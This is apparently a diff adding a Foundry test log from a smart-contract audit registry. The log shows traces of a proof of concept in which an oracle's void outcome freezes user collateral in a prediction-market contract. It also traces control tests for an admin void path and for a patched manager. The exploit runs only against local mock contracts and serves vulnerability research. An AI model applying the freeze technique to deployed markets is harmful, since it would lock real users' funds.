@@ -1,0 +1,258 @@
+Compiling 21 files with Solc 0.8.27
+Solc 0.8.27 finished in 2.33s
+Compiler run successful!
+
+Ran 3 tests for test/65418-oracle-void-outcome-leaves-predictionmarketv3managerclobvoid_exp.sol:OracleVoidLocksCollateralTest
+[PASS] test_control_adminVoidMarket_allowsRedeem() (gas: 1423477)
+Traces:
+  [1522977] OracleVoidLocksCollateralTest::test_control_adminVoidMarket_allowsRedeem()
+    ├─ [319688] → new MiniToken@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
+    │   ├─  storage changes:
+    │   │   @ 0: 0 → 0x436f6c6c61746572616c00000000000000000000000000000000000000000014
+    │   │   @ 1: 0 → 0x434f4c4c00000000000000000000000000000000000000000000000000000008
+    │   └─ ← [Return] 1368 bytes of code
+    ├─ [311356] → new PredictionMarketV3ManagerCLOB@0x2e234DAe75C793f67A35089C9d99245E1C58470b
+    │   └─ ← [Return] 1555 bytes of code
+    ├─ [53911] → new MockMarketOracle@0xF62849F9A0B5Bf2913b396098F7c7019b51A820a
+    │   └─ ← [Return] 269 bytes of code
+    ├─ [397954] → new ConditionalTokens@0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9
+    │   ├─  storage changes:
+    │   │   @ 0: 0 → 0x0000000000000000000000002e234dae75c793f67a35089c9d99245e1c58470b
+    │   └─ ← [Return] 1876 bytes of code
+    ├─ [88946] PredictionMarketV3ManagerCLOB::createMarket(MockMarketOracle: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], MiniToken: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
+    │   ├─  storage changes:
+    │   │   @ 0xad3228b676f7d3cd4284a5443f17f1962b36e491b30a40b2405849e597ba5fb5: 0 → 0x000000000000000000000001f62849f9a0b5bf2913b396098f7c7019b51a820a
+    │   │   @ 0xad3228b676f7d3cd4284a5443f17f1962b36e491b30a40b2405849e597ba5fb6: 0 → 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffd
+    │   │   @ 2: 0 → 1
+    │   │   @ 0xad3228b676f7d3cd4284a5443f17f1962b36e491b30a40b2405849e597ba5fb7: 0 → 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
+    │   └─ ← [Return] 0
+    ├─ [0] VM::startPrank(0x1111111111111111111111111111111111111111)
+    │   └─ ← [Return]
+    ├─ [44724] MiniToken::mint(0x1111111111111111111111111111111111111111, 1000000000000000000 [1e18])
+    │   ├─  storage changes:
+    │   │   @ 2: 0 → 0x0000000000000000000000000000000000000000000000000de0b6b3a7640000
+    │   │   @ 0xfc40ea33816453f766ebc0872d4b5152b468882abe7b6b35528069db4d6e41c4: 0 → 0x0000000000000000000000000000000000000000000000000de0b6b3a7640000
+    │   └─ ← [Stop]
+    ├─ [22492] MiniToken::approve(ConditionalTokens: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], 1000000000000000000 [1e18])
+    │   ├─  storage changes:
+    │   │   @ 0xfa5e95a080f825016359c2f307dc54bd14435d1a1e0efc59094d13fc7ef0876d: 0 → 0x0000000000000000000000000000000000000000000000000de0b6b3a7640000
+    │   └─ ← [Return] true
+    ├─ [70056] ConditionalTokens::splitPosition(0, 1000000000000000000 [1e18])
+    │   ├─ [347] PredictionMarketV3ManagerCLOB::getMarketCollateral(0) [staticcall]
+    │   │   └─ ← [Return] MiniToken: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]
+    │   ├─ [23368] MiniToken::transferFrom(0x1111111111111111111111111111111111111111, ConditionalTokens: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], 1000000000000000000 [1e18])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xfc40ea33816453f766ebc0872d4b5152b468882abe7b6b35528069db4d6e41c4: 0x0000000000000000000000000000000000000000000000000de0b6b3a7640000 → 0
+    │   │   │   @ 0x901757bd96cc5f1ebefaecb19cc709dd2fbc8b44eda17127b78370257dff34c9: 0 → 0x0000000000000000000000000000000000000000000000000de0b6b3a7640000
+    │   │   │   @ 0xfa5e95a080f825016359c2f307dc54bd14435d1a1e0efc59094d13fc7ef0876d: 0x0000000000000000000000000000000000000000000000000de0b6b3a7640000 → 0
+    │   │   └─ ← [Return] true
+    │   ├─  storage changes:
+    │   │   @ 0x1e326652d58b797a1130da11dcb1b905b62c36d4c022e0c36adb57e721c92752: 0 → 0x0000000000000000000000000000000000000000000000000de0b6b3a7640000
+    │   │   @ 0x689bf653b8da9e98ad3f42db0b7461528ae55740cf2e29d127a0278dbcf2212b: 0 → 0x0000000000000000000000000000000000000000000000000de0b6b3a7640000
+    │   └─ ← [Stop]
+    ├─ [0] VM::stopPrank()
+    │   └─ ← [Return]
+    ├─ [45408] PredictionMarketV3ManagerCLOB::adminVoidMarket(0, 500000000000000000 [5e17], 500000000000000000 [5e17])
+    │   ├─  storage changes:
+    │   │   @ 0xad3228b676f7d3cd4284a5443f17f1962b36e491b30a40b2405849e597ba5fb6: 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffd → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+    │   │   @ 0xa6eef7e35abe7026729641147f7915573c7e97b47efa546f5f6e3230263bcb4a: 0 → 0x00000000000000000000000000000000000000000000000006f05b59d3b20000
+    │   │   @ 0xad3228b676f7d3cd4284a5443f17f1962b36e491b30a40b2405849e597ba5fb5: 0x000000000000000000000001f62849f9a0b5bf2913b396098f7c7019b51a820a → 0x000000000000000000000002f62849f9a0b5bf2913b396098f7c7019b51a820a
+    │   │   @ 0xa6eef7e35abe7026729641147f7915573c7e97b47efa546f5f6e3230263bcb49: 0 → 0x00000000000000000000000000000000000000000000000006f05b59d3b20000
+    │   └─ ← [Return] -1
+    ├─ [530] MiniToken::balanceOf(ConditionalTokens: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9]) [staticcall]
+    │   └─ ← [Return] 1000000000000000000 [1e18]
+    ├─ [0] VM::assertEq(1000000000000000000 [1e18], 1000000000000000000 [1e18], "collateral held pre-redeem") [staticcall]
+    │   └─ ← [Return]
+    ├─ [0] VM::prank(0x1111111111111111111111111111111111111111)
+    │   └─ ← [Return]
+    ├─ [26586] ConditionalTokens::redeemVoided(0)
+    │   ├─ [436] PredictionMarketV3ManagerCLOB::getMarketResolvedOutcome(0) [staticcall]
+    │   │   └─ ← [Return] -1
+    │   ├─ [783] PredictionMarketV3ManagerCLOB::getVoidedPayouts(0) [staticcall]
+    │   │   └─ ← [Return] 500000000000000000 [5e17], 500000000000000000 [5e17]
+    │   ├─ [347] PredictionMarketV3ManagerCLOB::getMarketCollateral(0) [staticcall]
+    │   │   └─ ← [Return] MiniToken: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]
+    │   ├─ [20980] MiniToken::transfer(0x1111111111111111111111111111111111111111, 1000000000000000000 [1e18])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x901757bd96cc5f1ebefaecb19cc709dd2fbc8b44eda17127b78370257dff34c9: 0x0000000000000000000000000000000000000000000000000de0b6b3a7640000 → 0
+    │   │   │   @ 0xfc40ea33816453f766ebc0872d4b5152b468882abe7b6b35528069db4d6e41c4: 0 → 0x0000000000000000000000000000000000000000000000000de0b6b3a7640000
+    │   │   └─ ← [Return] true
+    │   ├─  storage changes:
+    │   │   @ 0x689bf653b8da9e98ad3f42db0b7461528ae55740cf2e29d127a0278dbcf2212b: 0x0000000000000000000000000000000000000000000000000de0b6b3a7640000 → 0
+    │   │   @ 0x1e326652d58b797a1130da11dcb1b905b62c36d4c022e0c36adb57e721c92752: 0x0000000000000000000000000000000000000000000000000de0b6b3a7640000 → 0
+    │   └─ ← [Stop]
+    ├─ [530] MiniToken::balanceOf(0x1111111111111111111111111111111111111111) [staticcall]
+    │   └─ ← [Return] 1000000000000000000 [1e18]
+    ├─ [0] VM::assertEq(1000000000000000000 [1e18], 1000000000000000000 [1e18], "holder recovers full collateral") [staticcall]
+    │   └─ ← [Return]
+    ├─ [530] MiniToken::balanceOf(ConditionalTokens: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9]) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [0] VM::assertEq(0, 0, "no collateral left frozen") [staticcall]
+    │   └─ ← [Return]
+    └─ ← [Return]
+
+[PASS] test_control_fixedManager_rejectsMinusOne() (gas: 921403)
+Traces:
+  [921403] OracleVoidLocksCollateralTest::test_control_fixedManager_rejectsMinusOne()
+    ├─ [319688] → new MiniToken@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
+    │   ├─  storage changes:
+    │   │   @ 1: 0 → 0x434f4c4c00000000000000000000000000000000000000000000000000000008
+    │   │   @ 0: 0 → 0x436f6c6c61746572616c00000000000000000000000000000000000000000014
+    │   └─ ← [Return] 1368 bytes of code
+    ├─ [310756] → new PredictionMarketV3ManagerCLOBFixed@0x2e234DAe75C793f67A35089C9d99245E1C58470b
+    │   └─ ← [Return] 1552 bytes of code
+    ├─ [53911] → new MockMarketOracle@0xF62849F9A0B5Bf2913b396098F7c7019b51A820a
+    │   └─ ← [Return] 269 bytes of code
+    ├─ [44470] MockMarketOracle::setResult(-1, true)
+    │   ├─  storage changes:
+    │   │   @ 1: 0 → 1
+    │   │   @ 0: 0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+    │   └─ ← [Return]
+    ├─ [88946] PredictionMarketV3ManagerCLOBFixed::createMarket(MockMarketOracle: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], MiniToken: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
+    │   ├─  storage changes:
+    │   │   @ 2: 0 → 1
+    │   │   @ 0xad3228b676f7d3cd4284a5443f17f1962b36e491b30a40b2405849e597ba5fb6: 0 → 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffd
+    │   │   @ 0xad3228b676f7d3cd4284a5443f17f1962b36e491b30a40b2405849e597ba5fb7: 0 → 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
+    │   │   @ 0xad3228b676f7d3cd4284a5443f17f1962b36e491b30a40b2405849e597ba5fb5: 0 → 0x000000000000000000000001f62849f9a0b5bf2913b396098f7c7019b51a820a
+    │   └─ ← [Return] 0
+    ├─ [0] VM::expectRevert(custom error 0xf28dceb3:  oracle: invalid outcome)
+    │   └─ ← [Return]
+    ├─ [1498] PredictionMarketV3ManagerCLOBFixed::resolveMarket(0)
+    │   ├─ [430] MockMarketOracle::getResult(0) [staticcall]
+    │   │   └─ ← [Return] -1, true
+    │   └─ ← [Revert] oracle: invalid outcome
+    └─ ← [Return]
+
+[PASS] test_exploit_oracleVoidFreezesCollateral() (gas: 2598848)
+Traces:
+  [2638648] OracleVoidLocksCollateralTest::test_exploit_oracleVoidFreezesCollateral()
+    ├─ [2183182] → new Exploit@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
+    │   ├─ [319688] → new MiniToken@0x104fBc016F4bb334D775a19E8A6510109AC63E00
+    │   │   ├─  storage changes:
+    │   │   │   @ 0: 0 → 0x436f6c6c61746572616c00000000000000000000000000000000000000000014
+    │   │   │   @ 1: 0 → 0x434f4c4c00000000000000000000000000000000000000000000000000000008
+    │   │   └─ ← [Return] 1368 bytes of code
+    │   ├─ [311356] → new PredictionMarketV3ManagerCLOB@0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3
+    │   │   └─ ← [Return] 1555 bytes of code
+    │   ├─ [53911] → new MockMarketOracle@0xDDc10602782af652bB913f7bdE1fD82981Db7dd9
+    │   │   └─ ← [Return] 269 bytes of code
+    │   ├─ [397954] → new ConditionalTokens@0x7FdB3132Ff7D02d8B9e221c61cC895ce9a4bb773
+    │   │   ├─  storage changes:
+    │   │   │   @ 0: 0 → 0x000000000000000000000000037eda3adb1198021a9b2e88c22b464fd38db3f3
+    │   │   └─ ← [Return] 1876 bytes of code
+    │   ├─ [319688] → new MiniToken@0xfD07C974e33dd1626640bA3a5acF0418FaacCA7a
+    │   │   ├─  storage changes:
+    │   │   │   @ 0: 0 → 0x4c6f636b656420436f6c6c61746572616c000000000000000000000000000022
+    │   │   │   @ 1: 0 → 0x4c4f434b45442d434f4c4c000000000000000000000000000000000000000016
+    │   │   └─ ← [Return] 1368 bytes of code
+    │   ├─  storage changes:
+    │   │   @ 1: 0 → 0x000000000000000000000000037eda3adb1198021a9b2e88c22b464fd38db3f3
+    │   │   @ 10: 0 → 0x0000000000000000000000007fdb3132ff7d02d8b9e221c61cc895ce9a4bb773
+    │   │   @ 2: 0 → 0x000000000000000000000000ddc10602782af652bb913f7bde1fd82981db7dd9
+    │   │   @ 3: 0 → 0x0000000000000000000000007fdb3132ff7d02d8b9e221c61cc895ce9a4bb773
+    │   │   @ 4: 0 → 0x000000000000000000000000fd07c974e33dd1626640ba3a5acf0418faacca7a
+    │   │   @ 11: 0 → 0x000000000000000000000000104fbc016f4bb334d775a19e8a6510109ac63e00
+    │   │   @ 12: 0 → 0x000000000000000000000000fd07c974e33dd1626640ba3a5acf0418faacca7a
+    │   │   @ 9: 0 → 0x000000000000000000000000037eda3adb1198021a9b2e88c22b464fd38db3f3
+    │   │   @ 0: 0 → 0x000000000000000000000000104fbc016f4bb334d775a19e8a6510109ac63e00
+    │   └─ ← [Return] 2091 bytes of code
+    ├─ [400018] Exploit::run()
+    │   ├─ [44470] MockMarketOracle::setResult(-1, true)
+    │   │   ├─  storage changes:
+    │   │   │   @ 1: 0 → 1
+    │   │   │   @ 0: 0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+    │   │   └─ ← [Return]
+    │   ├─ [88946] PredictionMarketV3ManagerCLOB::createMarket(MockMarketOracle: [0xDDc10602782af652bB913f7bdE1fD82981Db7dd9], MiniToken: [0x104fBc016F4bb334D775a19E8A6510109AC63E00])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xad3228b676f7d3cd4284a5443f17f1962b36e491b30a40b2405849e597ba5fb6: 0 → 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffd
+    │   │   │   @ 2: 0 → 1
+    │   │   │   @ 0xad3228b676f7d3cd4284a5443f17f1962b36e491b30a40b2405849e597ba5fb7: 0 → 0x000000000000000000000000104fbc016f4bb334d775a19e8a6510109ac63e00
+    │   │   │   @ 0xad3228b676f7d3cd4284a5443f17f1962b36e491b30a40b2405849e597ba5fb5: 0 → 0x000000000000000000000001ddc10602782af652bb913f7bde1fd82981db7dd9
+    │   │   └─ ← [Return] 0
+    │   ├─ [44724] MiniToken::mint(Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1000000000000000000 [1e18])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x0ce12da53e0bbcec8d2a75a7df18dfd3593b3d971c21bd9738c534e226d67d60: 0 → 0x0000000000000000000000000000000000000000000000000de0b6b3a7640000
+    │   │   │   @ 2: 0 → 0x0000000000000000000000000000000000000000000000000de0b6b3a7640000
+    │   │   └─ ← [Stop]
+    │   ├─ [22492] MiniToken::approve(ConditionalTokens: [0x7FdB3132Ff7D02d8B9e221c61cC895ce9a4bb773], 1000000000000000000 [1e18])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xfea26860e38289d006bdf7efe1164013a8dc224193fc16e58a094d37b2d9c799: 0 → 0x0000000000000000000000000000000000000000000000000de0b6b3a7640000
+    │   │   └─ ← [Return] true
+    │   ├─ [70056] ConditionalTokens::splitPosition(0, 1000000000000000000 [1e18])
+    │   │   ├─ [347] PredictionMarketV3ManagerCLOB::getMarketCollateral(0) [staticcall]
+    │   │   │   └─ ← [Return] MiniToken: [0x104fBc016F4bb334D775a19E8A6510109AC63E00]
+    │   │   ├─ [23368] MiniToken::transferFrom(Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], ConditionalTokens: [0x7FdB3132Ff7D02d8B9e221c61cC895ce9a4bb773], 1000000000000000000 [1e18])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0xba24e7e6b4df34f8c31e4519b991325a0ca6aa99983a680ca2a69b3c77f789d0: 0 → 0x0000000000000000000000000000000000000000000000000de0b6b3a7640000
+    │   │   │   │   @ 0xfea26860e38289d006bdf7efe1164013a8dc224193fc16e58a094d37b2d9c799: 0x0000000000000000000000000000000000000000000000000de0b6b3a7640000 → 0
+    │   │   │   │   @ 0x0ce12da53e0bbcec8d2a75a7df18dfd3593b3d971c21bd9738c534e226d67d60: 0x0000000000000000000000000000000000000000000000000de0b6b3a7640000 → 0
+    │   │   │   └─ ← [Return] true
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x66502ae51a1240b17625fecda21229926cb65583fb85816adb10ab0c17199ef3: 0 → 0x0000000000000000000000000000000000000000000000000de0b6b3a7640000
+    │   │   │   @ 0xfe96add3e378e5c23b59e4fb901d15e0ba8c87f47383804eb0525f2be9dc551f: 0 → 0x0000000000000000000000000000000000000000000000000de0b6b3a7640000
+    │   │   └─ ← [Stop]
+    │   ├─ [1833] PredictionMarketV3ManagerCLOB::resolveMarket(0)
+    │   │   ├─ [430] MockMarketOracle::getResult(0) [staticcall]
+    │   │   │   └─ ← [Return] -1, true
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xad3228b676f7d3cd4284a5443f17f1962b36e491b30a40b2405849e597ba5fb5: 0x000000000000000000000001ddc10602782af652bb913f7bde1fd82981db7dd9 → 0x000000000000000000000002ddc10602782af652bb913f7bde1fd82981db7dd9
+    │   │   │   @ 0xad3228b676f7d3cd4284a5443f17f1962b36e491b30a40b2405849e597ba5fb6: 0xfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffd → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+    │   │   └─ ← [Return] -1
+    │   ├─ [6552] ConditionalTokens::redeemVoided(0)
+    │   │   ├─ [436] PredictionMarketV3ManagerCLOB::getMarketResolvedOutcome(0) [staticcall]
+    │   │   │   └─ ← [Return] -1
+    │   │   ├─ [4783] PredictionMarketV3ManagerCLOB::getVoidedPayouts(0) [staticcall]
+    │   │   │   └─ ← [Return] 0, 0
+    │   │   └─ ← [Revert] invalid payout ratios
+    │   ├─ [530] MiniToken::balanceOf(ConditionalTokens: [0x7FdB3132Ff7D02d8B9e221c61cC895ce9a4bb773]) [staticcall]
+    │   │   └─ ← [Return] 1000000000000000000 [1e18]
+    │   ├─ [44724] MiniToken::mint(0x000000000000000000000000000000000000D00d, 1000000000000000000 [1e18])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x494c6a187b5f0ab149a904d98255e546761031f5c4a839c3a72b33eb009c7912: 0 → 0x0000000000000000000000000000000000000000000000000de0b6b3a7640000
+    │   │   │   @ 2: 0 → 0x0000000000000000000000000000000000000000000000000de0b6b3a7640000
+    │   │   └─ ← [Stop]
+    │   ├─ [530] MiniToken::balanceOf(0x000000000000000000000000000000000000D00d) [staticcall]
+    │   │   └─ ← [Return] 1000000000000000000 [1e18]
+    │   ├─  storage changes:
+    │   │   @ 8: 0 → 0x0000000000000000000000000000000000000000000000000de0b6b3a7640000
+    │   │   @ 6: 0 → 1
+    │   │   @ 7: 0 → 0x0000000000000000000000000000000000000000000000000de0b6b3a7640000
+    │   └─ ← [Return]
+    ├─ [317] Exploit::redeemReverted() [staticcall]
+    │   └─ ← [Return] true
+    ├─ [0] VM::assertTrue(true, "redeemVoided should revert for oracle-voided market") [staticcall]
+    │   └─ ← [Return]
+    ├─ [552] Exploit::collateralAddr() [staticcall]
+    │   └─ ← [Return] MiniToken: [0x104fBc016F4bb334D775a19E8A6510109AC63E00]
+    ├─ [483] Exploit::conditionalTokensAddr() [staticcall]
+    │   └─ ← [Return] ConditionalTokens: [0x7FdB3132Ff7D02d8B9e221c61cC895ce9a4bb773]
+    ├─ [530] MiniToken::balanceOf(ConditionalTokens: [0x7FdB3132Ff7D02d8B9e221c61cC895ce9a4bb773]) [staticcall]
+    │   └─ ← [Return] 1000000000000000000 [1e18]
+    ├─ [0] VM::assertEq(1000000000000000000 [1e18], 1000000000000000000 [1e18], "collateral frozen in ConditionalTokens") [staticcall]
+    │   └─ ← [Return]
+    ├─ [481] Exploit::lockedCollateral() [staticcall]
+    │   └─ ← [Return] 1000000000000000000 [1e18]
+    ├─ [0] VM::assertEq(1000000000000000000 [1e18], 1000000000000000000 [1e18], "locked magnitude") [staticcall]
+    │   └─ ← [Return]
+    ├─ [461] Exploit::markerAddr() [staticcall]
+    │   └─ ← [Return] MiniToken: [0xfD07C974e33dd1626640bA3a5acF0418FaacCA7a]
+    ├─ [530] MiniToken::balanceOf(0x000000000000000000000000000000000000D00d) [staticcall]
+    │   └─ ← [Return] 1000000000000000000 [1e18]
+    ├─ [0] VM::assertEq(1000000000000000000 [1e18], 1000000000000000000 [1e18], "LOCKED-COLL marker minted to SINK") [staticcall]
+    │   └─ ← [Return]
+    ├─ [271] Exploit::managerAddr() [staticcall]
+    │   └─ ← [Return] PredictionMarketV3ManagerCLOB: [0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3]
+    ├─ [371] Exploit::marketId() [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [4783] PredictionMarketV3ManagerCLOB::getVoidedPayouts(0) [staticcall]
+    │   └─ ← [Return] 0, 0
+    ├─ [0] VM::assertEq(0, 0, "outcome0 payout never set") [staticcall]
+    │   └─ ← [Return]
+    ├─ [0] VM::assertEq(0, 0, "outcome1 payout never set") [staticcall]
+    │   └─ ← [Return]
+    └─ ← [Return]
+
+Suite result: ok. 3 passed; 0 failed; 0 skipped; finished in 1.53ms (2.44ms CPU time)
+
+Ran 1 test suite in 128.96ms (1.53ms CPU time): 3 tests passed, 0 failed, 0 skipped (3 total tests)
+_shared/run-poc/run_poc.sh: line 71: 61521 Killed: 9               nice -n 10 anvil --load-state "$TMPROOT/anvil_state.json" --port 0 --chain-id "$CHAINID" > "$ANVIL_LOG" 2>&1  (wd: ~/RustroverProjects/audits/evm-hack-registry/65418-oracle-void-outcome-leaves-predictionmarketv3managerclobvoid_exp)
